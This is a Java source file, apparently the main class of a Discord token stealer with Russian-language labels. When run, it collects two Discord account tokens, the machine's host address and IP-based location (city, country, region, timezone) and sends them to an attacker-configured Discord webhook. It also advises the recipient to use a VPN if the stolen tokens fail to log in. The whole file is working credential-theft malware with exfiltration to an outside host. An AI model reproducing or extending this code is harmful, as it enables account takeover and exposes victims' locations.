import application.Tokens;
import application.config.ConfigManager;
import application.discord.DiscordWebhook;
import application.modules.InfoModule;
import org.json.simple.parser.ParseException;

import java.awt.*;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.Inet4Address;
import java.time.LocalDateTime;

public class App {

    public static void main(String[] args) throws IOException, ParseException {

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
        }));


        InfoModule module = new InfoModule();

       DiscordWebhook webhook = new DiscordWebhook(ConfigManager.getWebhookUrl());
        webhook.setUsername("Токен бот");
        webhook.setTts(true);
        webhook.addEmbed(new DiscordWebhook.EmbedObject()
                .setTitle("Новый токен с `" + Inet4Address.getLocalHost() + "`")
                .setDescription(":earth_asia: Информация ")
                .setColor(new Color(93, 116, 229))
                .addField(":clock1: Время","`" + LocalDateTime.now() + "` msec", false)
                .addField(":label: Токен 1", "`" + Tokens.getTokens().get(0) + "`", false)
                .addField(":label: Токен 2", "`" + Tokens.getTokens().get(1) + "`", false));
        webhook.addEmbed(new DiscordWebhook.EmbedObject()
                .setDescription("Если у вас не заходит на аккаунт на всех токенах то используйте впн(либо повторите позже)")
                .setColor(new Color(142, 117, 232))
                .addField(":earth_asia: Город", module.getDataByIp("city"), true)
                .addField(":earth_asia: Страна", module.getDataByIp("country"), true)
                .addField(":earth_asia: Часовой пояс", module.getDataByIp("timezone"), true)
                .addField(":earth_asia: Область", module.getDataByIp("region"), true));

        webhook.execute(); //


    }

}
